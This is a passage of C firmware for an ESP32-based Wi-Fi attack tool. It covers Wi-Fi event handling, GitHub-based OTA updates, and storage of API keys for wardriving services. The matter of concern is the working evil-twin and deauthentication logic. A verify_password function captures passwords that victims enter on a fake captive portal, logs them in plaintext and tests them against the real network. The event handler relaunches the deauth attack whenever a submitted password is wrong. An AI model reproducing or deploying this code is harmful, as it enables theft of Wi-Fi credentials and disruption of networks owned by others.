            if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) && 
                g_selected_count > 0 && target_bssid_count > 0) {
                int idx = g_selected_indices[0];
                uint8_t target_channel = target_bssids[0].channel; // Use first target_bssid (corresponds to first selected network)
                MY_LOG_INFO(TAG, "Client connected to portal - switching to channel %d (first selected network: %s)", 
                           target_channel, g_scan_results[idx].ssid);
                esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            }
            
            // Wait a bit for DHCP to assign IP
            vTaskDelay(pdMS_TO_TICKS(3000));
            break;
        }
        case WIFI_EVENT_AP_STADISCONNECTED: {
            const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X, AID: %u, reason: %u",
                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid, e->reason);
            
            // Decrement connected clients counter
            if (portal_connected_clients > 0) {
                portal_connected_clients--;
            }            
            // If last client disconnected during evil twin attack, resume channel hopping
            if (portal_connected_clients == 0 && 
                (applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK)) {
                MY_LOG_INFO(TAG, "Last client disconnected - resuming channel hopping for deauth");
            }
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            bool suppress_scan_logs = periodic_rescan_in_progress || wardrive_active || channel_view_scan_mode;

            if (!suppress_scan_logs) {
                MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
            }

            g_last_scan_status = e->status;
            if (e->status == 0) { // Success
                g_scan_count = MAX_AP_CNT;
                esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results);
                
                if (!suppress_scan_logs) {
                    if (g_scan_start_time_us > 0) {
                        int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
                        float elapsed_s = elapsed_us / 1000000.0f;
                        MY_LOG_INFO(TAG, "Retrieved %u network records in %.1fs", g_scan_count, elapsed_s);
                    } else {
                        MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
                    }
                    
                    // Automatically display scan results after completion
                    if (g_scan_count > 0 && !sniffer_active) {
                        print_scan_results();
                    }
                }
            } else {
                if (!suppress_scan_logs) {
                    MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
                }
                g_scan_count = 0;
            }
            
            g_scan_done = true;
            g_scan_in_progress = false;

            // Update OLED with scan results (only if not suppressed / in sniffer)
            if (!suppress_scan_logs && !sniffer_active) {
                char oled_l2[32];
                snprintf(oled_l2, sizeof(oled_l2), "  Found %u APs", g_scan_count);
                char oled_l3[32];
                if (g_scan_start_time_us > 0) {
                    int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
                    float elapsed_s = elapsed_us / 1000000.0f;
                    snprintf(oled_l3, sizeof(oled_l3), "  %.1fs elapsed", elapsed_s);
                } else {
                    oled_l3[0] = '\0';
                }
                oled_display_update_full("> Scan Complete", oled_l2, oled_l3, "  > select next");
            }
            
            // Only reset applicationState to IDLE if not in active attack mode
            if (applicationState != DEAUTH && applicationState != DEAUTH_EVIL_TWIN && applicationState != EVIL_TWIN_PASS_CHECK) {
                applicationState = IDLE;
            }
            
            // Handle sniffer transition from scan to promiscuous mode
            if (sniffer_active && sniffer_scan_phase) {
                sniffer_process_scan_results();
                sniffer_scan_phase = false;
                
                // Set promiscuous filter (like Marauder)
                esp_wifi_set_promiscuous_filter(&sniffer_filter);
                
                // Enable promiscuous mode
                esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
                esp_wifi_set_promiscuous(true);
                
                // Initialize dual-band channel hopping
                sniffer_channel_index = 0;
                sniffer_current_channel = dual_band_channels[sniffer_channel_index];
                sniffer_last_channel_hop = esp_timer_get_time() / 1000;
                esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
                
                // Start channel hopping task for time-based hopping
                if (sniffer_channel_task_handle == NULL) {
                    xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
                    MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
                }
                
                // Change LED to green for active sniffing
                esp_err_t led_err = led_set_color(0, 255, 0); // Green
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to set sniffer LED: %s", esp_err_to_name(led_err));
                }
                
                MY_LOG_INFO(TAG, "Sniffer: Scan complete, now monitoring client traffic with dual-band channel hopping (2.4GHz + 5GHz)...");
            } else if (!wardrive_active) {
                // Return LED to idle when normal scan is complete
                esp_err_t led_err = led_set_idle();
                if (led_err != ESP_OK) {
                    ESP_LOGW(TAG, "Failed to restore idle LED after scan: %s", esp_err_to_name(led_err));
                }
            }
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED: {
            const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
            ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                     (const char*)e->ssid, (int)e->reason);
            
            // Signal wifi_connect command that connection failed (only if waiting)
            if (wifi_connect_result == 0) {
                wifi_connect_result = -1;
            }
            
            if (applicationState == EVIL_TWIN_PASS_CHECK) {
                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                if (connectAttemptCount >= 3) {
                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                    {
                        char et_l2[64];
                        snprintf(et_l2, sizeof(et_l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
                        oled_display_update_full("> Evil Twin", et_l2, "  Wrong password!", "  Resuming...");
                    }
                    applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                    
                    // Mark password as wrong for portal feedback
                    last_password_wrong = true;
                    
                    // Resume deauth attack since password was wrong
                    if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
                        MY_LOG_INFO(TAG, "Resuming deauth attack - password was incorrect.");
                        
                        // Set LED to red for deauth
                        esp_err_t led_err = led_set_color(255, 0, 0);
                        if (led_err != ESP_OK) {
                            ESP_LOGW(TAG, "Failed to set LED for deauth resume: %s", esp_err_to_name(led_err));
                        }
                        
                        // Start deauth attack in background task
                        deauth_attack_active = true;
                        BaseType_t result = xTaskCreate(
                            deauth_attack_task,
                            "deauth_task",
                            4096,  // Stack size
                            NULL,
                            5,     // Priority
                            &deauth_attack_task_handle
                        );
                        
                        if (result != pdPASS) {
                            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
                            deauth_attack_active = false;
                        } else {
                            MY_LOG_INFO(TAG, "Deauth attack resumed successfully.");
                        }
                    }
                } else {
                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                    connectAttemptCount++;
                    esp_wifi_connect();
                }
            } else if (applicationState == DEAUTH_EVIL_TWIN) {
                ESP_LOGW(TAG, "Evil twin: STA disconnect while attack active, keeping state");
            } else {
                ESP_LOGW(TAG, "Set app state to IDLE");
                applicationState = IDLE;
            }
            break;
        }
        default:
            break;
        }
    }
}

static bool ota_parse_version(const char *version, int *major, int *minor, int *patch) {
    if (!version || !major || !minor || !patch) {
        return false;
    }

    while (*version == 'v' || *version == 'V' || isspace((unsigned char)*version)) {
        version++;
    }

    int maj = 0;
    int min = 0;
    int pat = 0;
    int parsed = sscanf(version, "%d.%d.%d", &maj, &min, &pat);
    if (parsed < 1) {
        return false;
    }

    *major = maj;
    *minor = (parsed >= 2) ? min : 0;
    *patch = (parsed >= 3) ? pat : 0;
    return true;
}

static bool ota_is_newer_version(const char *current, const char *latest) {
    int cur_maj = 0;
    int cur_min = 0;
    int cur_pat = 0;
    int lat_maj = 0;
    int lat_min = 0;
    int lat_pat = 0;

    if (!ota_parse_version(current, &cur_maj, &cur_min, &cur_pat) ||
        !ota_parse_version(latest, &lat_maj, &lat_min, &lat_pat)) {
        MY_LOG_INFO(TAG, "OTA: version parse failed (current=%s, latest=%s)", current, latest);
        return false;
    }

    if (lat_maj != cur_maj) {
        return lat_maj > cur_maj;
    }
    if (lat_min != cur_min) {
        return lat_min > cur_min;
    }
    return lat_pat > cur_pat;
}

static esp_err_t ota_http_get(const char *url, char **out_buf, size_t *out_len) {
    if (!url || !out_buf || !out_len) {
        return ESP_ERR_INVALID_ARG;
    }

    *out_buf = NULL;
    *out_len = 0;

    esp_http_client_config_t config = {
        .url = url,
        .timeout_ms = 10000,
        .crt_bundle_attach = esp_crt_bundle_attach,
    };
    esp_http_client_handle_t client = esp_http_client_init(&config);
    if (!client) {
        return ESP_FAIL;
    }

    esp_http_client_set_header(client, "User-Agent", "projectZero-ota");
    esp_http_client_set_header(client, "Accept", "application/vnd.github+json");

    esp_err_t err = esp_http_client_open(client, 0);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: http open failed: %s", esp_err_to_name(err));
        esp_http_client_cleanup(client);
        return err;
    }

    esp_http_client_fetch_headers(client);
    int status = esp_http_client_get_status_code(client);
    if (status != 200) {
        MY_LOG_INFO(TAG, "OTA: http status %d for %s", status, url);
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_FAIL;
    }

    char *buf = heap_caps_calloc(1, OTA_HTTP_MAX_BODY + 1, MALLOC_CAP_SPIRAM);
    if (!buf) {
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_ERR_NO_MEM;
    }

    size_t total = 0;
    while (total < OTA_HTTP_MAX_BODY) {
        int read_len = esp_http_client_read(client, buf + total, OTA_HTTP_MAX_BODY - total);
        if (read_len < 0) {
            MY_LOG_INFO(TAG, "OTA: http read failed");
            free(buf);
            esp_http_client_close(client);
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }
        if (read_len == 0) {
            break;
        }
        total += (size_t)read_len;
    }

    if (total >= OTA_HTTP_MAX_BODY) {
        MY_LOG_INFO(TAG, "OTA: response too large");
        free(buf);
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_ERR_NO_MEM;
    }

    buf[total] = '\0';
    *out_buf = buf;
    *out_len = total;

    esp_http_client_close(client);
    esp_http_client_cleanup(client);
    return ESP_OK;
}

static esp_err_t ota_fetch_latest_release(char *url_out, size_t url_len,
                                          char *tag_out, size_t tag_len) {
    char api_url[256];
    int res = snprintf(api_url, sizeof(api_url),
                       "https://api.github.com/repos/%s/%s/releases/latest",
                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO);
    if (res < 0 || res >= (int)sizeof(api_url)) {
        return ESP_ERR_INVALID_SIZE;
    }

    char *body = NULL;
    size_t body_len = 0;
    esp_err_t err = ota_http_get(api_url, &body, &body_len);
    if (err != ESP_OK) {
        return err;
    }
    (void)body_len;

    cJSON *root = cJSON_Parse(body);
    if (!root) {
        free(body);
        return ESP_FAIL;
    }

    cJSON *tag = cJSON_GetObjectItem(root, "tag_name");
    cJSON *assets = cJSON_GetObjectItem(root, "assets");
    if (!cJSON_IsString(tag) || !cJSON_IsArray(assets)) {
        cJSON_Delete(root);
        free(body);
        return ESP_FAIL;
    }

    cJSON *asset = NULL;
    cJSON_ArrayForEach(asset, assets) {
        cJSON *name = cJSON_GetObjectItem(asset, "name");
        if (cJSON_IsString(name) && strcmp(name->valuestring, OTA_ASSET_NAME) == 0) {
            break;
        }
    }

    if (!asset) {
        MY_LOG_INFO(TAG, "OTA: asset %s not found in release", OTA_ASSET_NAME);
        cJSON_Delete(root);
        free(body);
        return ESP_ERR_NOT_FOUND;
    }

    cJSON *download = cJSON_GetObjectItem(asset, "browser_download_url");
    cJSON *size = cJSON_GetObjectItem(asset, "size");
    cJSON *updated = cJSON_GetObjectItem(asset, "updated_at");
    if (!cJSON_IsString(download)) {
        cJSON_Delete(root);
        free(body);
        return ESP_FAIL;
    }

    snprintf(tag_out, tag_len, "%s", tag->valuestring);
    snprintf(url_out, url_len, "%s", download->valuestring);
    if (cJSON_IsNumber(size)) {
        MY_LOG_INFO(TAG, "OTA: asset size=%lu bytes", (unsigned long)size->valuedouble);
    }
    if (cJSON_IsString(updated)) {
        MY_LOG_INFO(TAG, "OTA: asset updated_at=%s", updated->valuestring);
    }

    cJSON_Delete(root);
    free(body);
    return ESP_OK;
}

static esp_err_t ota_fetch_release_by_tag(const char *tag,
                                          char *url_out, size_t url_len,
                                          char *tag_out, size_t tag_len) {
    if (!tag || !*tag) {
        return ESP_ERR_INVALID_ARG;
    }

    char api_url[256];
    int res = snprintf(api_url, sizeof(api_url),
                       "https://api.github.com/repos/%s/%s/releases/tags/%s",
                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO, tag);
    if (res < 0 || res >= (int)sizeof(api_url)) {
        return ESP_ERR_INVALID_SIZE;
    }

    char *body = NULL;
    size_t body_len = 0;
    esp_err_t err = ota_http_get(api_url, &body, &body_len);
    if (err != ESP_OK) {
        return err;
    }
    (void)body_len;

    cJSON *root = cJSON_Parse(body);
    if (!root) {
        free(body);
        return ESP_FAIL;
    }

    cJSON *tag_json = cJSON_GetObjectItem(root, "tag_name");
    cJSON *assets = cJSON_GetObjectItem(root, "assets");
    if (!cJSON_IsString(tag_json) || !cJSON_IsArray(assets)) {
        cJSON_Delete(root);
        free(body);
        return ESP_FAIL;
    }

    cJSON *asset = NULL;
    cJSON_ArrayForEach(asset, assets) {
        cJSON *name = cJSON_GetObjectItem(asset, "name");
        if (cJSON_IsString(name) && strcmp(name->valuestring, OTA_ASSET_NAME) == 0) {
            break;
        }
    }

    if (!asset) {
        MY_LOG_INFO(TAG, "OTA: asset %s not found for tag %s", OTA_ASSET_NAME, tag);
        cJSON_Delete(root);
        free(body);
        return ESP_ERR_NOT_FOUND;
    }

    cJSON *download = cJSON_GetObjectItem(asset, "browser_download_url");
    cJSON *size = cJSON_GetObjectItem(asset, "size");
    cJSON *updated = cJSON_GetObjectItem(asset, "updated_at");
    if (!cJSON_IsString(download)) {
        cJSON_Delete(root);
        free(body);
        return ESP_FAIL;
    }

    snprintf(tag_out, tag_len, "%s", tag_json->valuestring);
    snprintf(url_out, url_len, "%s", download->valuestring);
    if (cJSON_IsNumber(size)) {
        MY_LOG_INFO(TAG, "OTA: asset size=%lu bytes", (unsigned long)size->valuedouble);
    }
    if (cJSON_IsString(updated)) {
        MY_LOG_INFO(TAG, "OTA: asset updated_at=%s", updated->valuestring);
    }

    cJSON_Delete(root);
    free(body);
    return ESP_OK;
}

static esp_err_t ota_build_branch_url(char *url_out, size_t url_len) {
    int res = snprintf(url_out, url_len,
                       "https://raw.githubusercontent.com/%s/%s/%s/ESP32C5/binaries-esp32c5/%s",
                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO, OTA_DEV_BRANCH, OTA_ASSET_NAME);
    if (res < 0 || res >= (int)url_len) {
        return ESP_ERR_INVALID_SIZE;
    }
    return ESP_OK;
}

static bool ota_is_expected_project(const esp_app_desc_t *desc) {
    if (!desc) {
        return false;
    }

    if (strncmp(desc->project_name, OTA_PROJECT_NAME, sizeof(desc->project_name)) != 0) {
        MY_LOG_INFO(TAG, "OTA: unexpected project '%s'", desc->project_name);
        return false;
    }
    return true;
}

static esp_err_t ota_perform_https_update(const char *download_url) {
    if (!download_url || !*download_url) {
        return ESP_ERR_INVALID_ARG;
    }

    esp_http_client_config_t http_cfg = {
        .url = download_url,
        .timeout_ms = 15000,
        .buffer_size = 16 * 1024,
        .buffer_size_tx = 4 * 1024,
        .crt_bundle_attach = esp_crt_bundle_attach,
    };
    esp_https_ota_config_t ota_cfg = {
        .http_config = &http_cfg,
    };

    esp_https_ota_handle_t ota_handle = NULL;
    esp_err_t err = esp_https_ota_begin(&ota_cfg, &ota_handle);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: begin failed: %s", esp_err_to_name(err));
        return err;
    }

    esp_app_desc_t app_desc = {0};
    err = esp_https_ota_get_img_desc(ota_handle, &app_desc);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: image desc failed: %s", esp_err_to_name(err));
        esp_https_ota_abort(ota_handle);
        return err;
    }

    MY_LOG_INFO(TAG, "OTA: image project=%s version=%s idf=%s",
                app_desc.project_name, app_desc.version, app_desc.idf_ver);
    if (!ota_is_expected_project(&app_desc)) {
        esp_https_ota_abort(ota_handle);
        return ESP_ERR_INVALID_STATE;
    }

    while ((err = esp_https_ota_perform(ota_handle)) == ESP_ERR_HTTPS_OTA_IN_PROGRESS) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: perform failed: %s", esp_err_to_name(err));
        esp_https_ota_abort(ota_handle);
        return err;
    }

    if (!esp_https_ota_is_complete_data_received(ota_handle)) {
        MY_LOG_INFO(TAG, "OTA: incomplete image");
        esp_https_ota_abort(ota_handle);
        return ESP_FAIL;
    }

    err = esp_https_ota_finish(ota_handle);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: finish failed: %s", esp_err_to_name(err));
        return err;
    }

    return ESP_OK;
}

static bool ota_has_ip(void) {
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        return false;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK) {
        return false;
    }

    return ip_info.ip.addr != 0;
}

static bool ota_is_connected(void) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        return false;
    }
    return ota_has_ip();
}

static void ota_led_task(void *pvParameters) {
    (void)pvParameters;
    if (!led_initialized) {
        vTaskDelete(NULL);
        return;
    }

    const int step = 15;
    while (ota_led_active) {
        for (int level = 0; level <= 255 && ota_led_active; level += step) {
            led_set_color((uint8_t)level, 0, 0);
            vTaskDelay(pdMS_TO_TICKS(30));
        }
        for (int level = 255; level >= 0 && ota_led_active; level -= step) {
            led_set_color((uint8_t)level, 0, 0);
            vTaskDelay(pdMS_TO_TICKS(30));
        }
    }

    led_set_idle();
    ota_led_task_handle = NULL;
    vTaskDelete(NULL);
}

static void ota_led_start(void) {
    if (ota_led_task_handle != NULL || !led_initialized) {
        return;
    }

    ota_led_active = true;
    BaseType_t ok = xTaskCreate(ota_led_task, "ota_led", 2048, NULL, 3, &ota_led_task_handle);
    if (ok != pdPASS) {
        ota_led_task_handle = NULL;
        ota_led_active = false;
    }
}

static void ota_led_stop(void) {
    if (ota_led_task_handle == NULL) {
        return;
    }
    ota_led_active = false;
}

typedef struct {
    char tag[64];
    bool use_tag;
    bool force_latest;
} ota_check_args_t;

static bool ota_start_check(const char *tag, bool force_latest) {
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP, skipping");
        return false;
    }
    if (ota_check_in_progress) {
        MY_LOG_INFO(TAG, "OTA: check already in progress");
        return false;
    }

    ota_check_in_progress = true;
    ota_check_args_t *args = calloc(1, sizeof(*args));
    if (!args) {
        ota_check_in_progress = false;
        MY_LOG_INFO(TAG, "OTA: out of memory");
        return false;
    }

    if (tag && *tag) {
        snprintf(args->tag, sizeof(args->tag), "%s", tag);
        args->use_tag = true;
    }
    args->force_latest = force_latest;

    BaseType_t task_ok = xTaskCreate(ota_check_task, "ota_check",
                                     OTA_TASK_STACK_SIZE, args,
                                     OTA_TASK_PRIORITY, NULL);
    if (task_ok != pdPASS) {
        free(args);
        ota_check_in_progress = false;
        MY_LOG_INFO(TAG, "OTA: failed to start check task");
        return false;
    }

    return true;
}

static void ota_check_task(void *pvParameters) {
    ota_check_args_t *args = (ota_check_args_t *)pvParameters;
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP, aborting");
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    if (strcmp(OTA_GITHUB_OWNER, "your-org") == 0 ||
        strcmp(OTA_GITHUB_REPO, "your-repo") == 0 ||
        strcmp(OTA_ASSET_NAME, "firmware.bin") == 0) {
        MY_LOG_INFO(TAG, "OTA: config not set, skipping update");
        ota_check_in_progress = false;
        vTaskDelete(NULL);
        return;
    }

    char latest_tag[64] = {0};
    char download_url[256] = {0};
    esp_err_t err = ESP_OK;
    bool skip_version_check = false;
    if (args && args->use_tag) {
        err = ota_fetch_release_by_tag(args->tag, download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    } else if (args && args->force_latest) {
        err = ota_fetch_latest_release(download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    } else if (strcmp(ota_channel, "dev") == 0) {
        err = ota_build_branch_url(download_url, sizeof(download_url));
        if (err == ESP_OK) {
            snprintf(latest_tag, sizeof(latest_tag), "branch:%s", OTA_DEV_BRANCH);
            skip_version_check = true;
            MY_LOG_INFO(TAG, "OTA: dev channel uses branch '%s'", OTA_DEV_BRANCH);
            MY_LOG_INFO(TAG, "OTA: branch url=%s", download_url);
        }
    } else {
        err = ota_fetch_latest_release(download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    }
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: failed to fetch release info: %s", esp_err_to_name(err));
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    if (!skip_version_check && !(args && args->use_tag) &&
        !ota_is_newer_version(JANOS_VERSION, latest_tag)) {
        MY_LOG_INFO(TAG, "OTA: no update (current=%s, latest=%s)", JANOS_VERSION, latest_tag);
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "OTA: current=%s, target=%s", JANOS_VERSION, latest_tag);
    MY_LOG_INFO(TAG, "OTA: updating to %s", latest_tag);
    const esp_partition_t *target_part = esp_ota_get_next_update_partition(NULL);
    MY_LOG_INFO(TAG, "OTA: target partition=%s offset=0x%lx",
                target_part ? target_part->label : "n/a",
                target_part ? (unsigned long)target_part->address : 0UL);
    ota_led_start();
    err = ota_perform_https_update(download_url);
    ota_led_stop();
    if (err == ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: update applied, restarting");
        ota_check_in_progress = false;
        free(args);
        safe_restart();  // unmount SD card before restart
    } else {
        MY_LOG_INFO(TAG, "OTA: update failed: %s", esp_err_to_name(err));
    }

    ota_check_in_progress = false;
    free(args);
    vTaskDelete(NULL);
}

static void ip_event_handler(void *event_handler_arg,
                             esp_event_base_t event_base,
                             int32_t event_id,
                             void *event_data) {
    (void)event_handler_arg;
    (void)event_data;

    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        if (ota_auto_on_ip && !ota_check_started) {
            if (ota_start_check(NULL, false)) {
                ota_check_started = true;
            }
        }
    }
}

// --- Password verification function (used by portal) ---
static void verify_password(const char* password) {
    evilTwinPassword = malloc(strlen(password) + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, password);
    } else {
        ESP_LOGW(TAG,"Malloc error for password");
    }

    MY_LOG_INFO(TAG, "Password received: %s", password);

    {
        char et_l2[64];
        snprintf(et_l2, sizeof(et_l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
        oled_display_update_full("> Evil Twin", et_l2, "  Got password!", "  Verifying...");
    }

    // Stop deauth attack BEFORE attempting to connect
    // This is crucial because deauth task switches channels which prevents stable STA connection
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack to attempt connection...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
        }
        
        // Restore LED to idle
        esp_err_t led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after stopping deauth: %s", esp_err_to_name(led_err));
        }
        
        MY_LOG_INFO(TAG, "Deauth attack stopped.");
    }

    //Now, let's check if it's a password for Evil Twin:
    applicationState = EVIL_TWIN_PASS_CHECK;

    //set up STA properties and try to connect to a network:
    wifi_config_t sta_config = { 0 };  
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
    connectAttemptCount = 0;
    MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
    esp_wifi_connect();
}

static void ota_load_channel_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(OTA_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err != ESP_OK) {
        return;
    }

    size_t len = sizeof(ota_channel);
    err = nvs_get_str(handle, OTA_NVS_KEY_CHANNEL, ota_channel, &len);
    if (err != ESP_OK) {
        nvs_close(handle);
        return;
    }

    if (strcasecmp(ota_channel, "main") != 0 && strcasecmp(ota_channel, "dev") != 0) {
        snprintf(ota_channel, sizeof(ota_channel), "main");
    }

    nvs_close(handle);
}

static bool ota_save_channel_to_nvs(const char *channel) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        return false;
    }

    err = nvs_set_str(handle, OTA_NVS_KEY_CHANNEL, channel);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    return err == ESP_OK;
}

// --------------- WPA-SEC NVS helpers ---------------

static void wpasec_load_key_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WPASEC_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err != ESP_OK) {
        return;
    }

    size_t len = sizeof(wpasec_api_key);
    err = nvs_get_str(handle, WPASEC_NVS_KEY, wpasec_api_key, &len);
    if (err != ESP_OK) {
        wpasec_api_key[0] = '\0';
    }
    nvs_close(handle);
}

static bool wpasec_save_key_to_nvs(const char *key) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WPASEC_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        return false;
    }

    err = nvs_set_str(handle, WPASEC_NVS_KEY, key);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    return err == ESP_OK;
}

static void wigle_load_key_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WIGLE_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err != ESP_OK) {
        return;
    }

    size_t name_len = sizeof(wigle_api_name);
    size_t token_len = sizeof(wigle_api_token);
    err = nvs_get_str(handle, WIGLE_NVS_KEY_NAME, wigle_api_name, &name_len);
    if (err != ESP_OK) {
        wigle_api_name[0] = '\0';
    }
    err = nvs_get_str(handle, WIGLE_NVS_KEY_TOKEN, wigle_api_token, &token_len);
    if (err != ESP_OK) {
        wigle_api_token[0] = '\0';
    }
    nvs_close(handle);
}

static bool wigle_save_key_to_nvs(const char *api_name, const char *api_token) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WIGLE_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        return false;
    }

    err = nvs_set_str(handle, WIGLE_NVS_KEY_NAME, api_name);
    if (err == ESP_OK) {
        err = nvs_set_str(handle, WIGLE_NVS_KEY_TOKEN, api_token);
    }
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    return err == ESP_OK;
}

static void wdgwars_load_key_from_nvs(void) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WDGWARS_NVS_NAMESPACE, NVS_READONLY, &handle);
    if (err != ESP_OK) {
        return;
    }

    size_t len = sizeof(wdgwars_api_key);
    err = nvs_get_str(handle, WDGWARS_NVS_KEY, wdgwars_api_key, &len);
    if (err != ESP_OK) {
        wdgwars_api_key[0] = '\0';
    }
    nvs_close(handle);
}

static bool wdgwars_save_key_to_nvs(const char *key) {
    nvs_handle_t handle;
    esp_err_t err = nvs_open(WDGWARS_NVS_NAMESPACE, NVS_READWRITE, &handle);
    if (err != ESP_OK) {
        return false;
    }

    err = nvs_set_str(handle, WDGWARS_NVS_KEY, key);
    if (err == ESP_OK) {
        err = nvs_commit(handle);
    }
    nvs_close(handle);
    return err == ESP_OK;
}

// ---------------------------------------------------

static void ota_mark_valid_if_pending(void) {
    const esp_partition_t *running = esp_ota_get_running_partition();
    if (!running) {
        return;
    }

    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;
    esp_err_t err = esp_ota_get_state_partition(running, &state);
    if (err != ESP_OK) {
        return;
    }

    if (state == ESP_OTA_IMG_PENDING_VERIFY) {
        MY_LOG_INFO(TAG, "OTA: pending verify on %s, marking app valid", running->label);
        err = esp_ota_mark_app_valid_cancel_rollback();
        if (err != ESP_OK) {
            MY_LOG_INFO(TAG, "OTA: mark valid failed: %s", esp_err_to_name(err));
        } else {
            MY_LOG_INFO(TAG, "OTA: app marked valid");
        }
    } else {
